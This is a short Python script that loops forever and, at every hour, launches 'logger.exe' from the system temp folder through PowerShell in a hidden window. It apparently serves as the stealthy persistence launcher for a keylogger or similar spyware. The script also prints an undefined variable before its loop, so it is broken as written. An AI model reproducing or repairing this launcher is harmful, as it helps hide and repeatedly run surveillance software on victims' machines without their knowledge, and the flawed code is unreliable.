import logger
import datetime
import time
import os
import subprocess
import tempfile

triggerTimes = [
    '00:00:00',
    '01:00:00',
    '02:00:00',
    '03:00:00',
    '04:00:00',
    '05:00:00',
    '06:00:00',
    '07:00:00',
    '08:00:00',
    '09:00:00',
    '10:00:00',
    '11:00:00',
    '12:00:00',
    '13:00:00',
    '14:00:00',
    '15:00:00',
    '16:00:00',
    '17:00:00',
    '18:00:00',
    '19:00:00',
    '20:00:00',
    '21:00:00',
    '22:00:00',
    '23:00:00',
]

triggerTimes.sort()
print(c)

while True:
    for tTime in triggerTimes:
        c = datetime.datetime.now()
        tt = datetime.datetime.strptime(tTime, "%H:%M:%S").replace(year=c.year,month=c.month,day=c.day)
        if datetime.datetime.now()  < tt:
            time.sleep((tt-datetime.datetime.now()).total_seconds())
            ld = os.path.join(tempfile.gettempdir(), 'logger.exe')
            subprocess.run(['powershell', 'start-process', 'powershell.exe', '-windowstyle', 'hidden', ld], shell=True)


            

            
